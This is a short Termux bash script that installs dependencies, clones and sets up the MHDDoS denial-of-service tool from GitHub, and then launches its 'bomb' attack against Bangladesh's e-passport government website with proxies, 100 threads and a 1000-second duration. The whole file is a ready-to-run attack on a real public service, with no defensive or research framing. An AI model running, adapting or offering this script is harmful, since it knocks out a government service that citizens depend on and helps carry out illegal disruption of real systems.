#!/data/data/com.termux/files/usr/bin/bash

# Update package lists and install necessary packages
apt -y update &&  apt -y install curl wget python3  rust make cmake automake autoconf m4 build-essential git

# Wait for 3 seconds to ensure all installations are completed
sleep 3

# Clone the MHDDoS repository
if git clone https://github.com/MatrixTM/MHDDoS.git; then
    echo "Successfully cloned MHDDoS repository."
else
    echo "Failed to clone MHDDoS repository. Exiting."
    exit 1
fi

# Change to the MHDDoS directory
cd MHDDoS || { echo "Failed to change directory to MHDDoS. Exiting."; exit 1; }

# Install Python dependencies
if pip3 install -r requirements.txt; then
    echo "Successfully installed Python dependencies."
else
    echo "Failed to install Python dependencies. Exiting."
    exit 1
fi

# Wait for 5 seconds before starting the attack
sleep 5

echo 'Starting attack...'
sleep 3

# Start the attack using the specified parameters
if python3 start.py bomb https://www.epassport.gov.bd 0 50 proxy.txt 100 1000; then
    echo "Attack started successfully."
else
    echo "Failed to start the attack."
    exit 1
fi
